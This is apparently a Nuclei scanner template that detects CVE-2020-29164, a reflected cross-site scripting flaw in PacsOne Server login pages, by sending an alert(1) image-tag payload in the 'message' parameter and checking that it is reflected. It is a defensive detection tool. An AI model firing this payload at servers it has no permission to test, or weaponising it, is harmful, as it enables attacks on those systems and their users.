id: CVE-2020-29164

info:
  name: PacsOne Server <7.1.1 - Cross-Site Scripting
  author: geeknik
  severity: medium
  description: PacsOne Server (PACS Server In One Box) below 7.1.1 is vulnerable to cross-site scripting.
  remediation: |
    Upgrade to PacsOne Server version 7.1.1 or later to mitigate this vulnerability.
  reference:
    - https://gist.github.com/leommxj/0a32afeeaac960682c5b7c9ca8ed070d
    - https://pacsone.net/download.htm
    - https://nvd.nist.gov/vuln/detail/CVE-2020-29164
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-29164
    cwe-id: CWE-79
    epss-score: 0.00205
    epss-percentile: 0.58262
    cpe: cpe:2.3:a:rainbowfishsoftware:pacsone_server:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: rainbowfishsoftware
    product: pacsone_server
  tags: pacsone,xss,cve,cve2020,rainbowfishsoftware

http:
  - method: GET
    path:
      - "{{BaseURL}}/pacs/login.php?message=%3Cimg%20src=%22%22%20onerror=%22alert(1);%22%3E1%3C/img%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body
        words:
          - '<img src="" onerror="alert(1);">1</img>'

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100f2f755d45c926bdc6f056be39c45fbdf643b2a47e0babf9fe3cd454250760efa022100d333f50d4efc4013c9563c60215f443e8c4f28cd9d3c61dcc7b0be921328b5c3:922c64590222798bb761d5b6d8e72950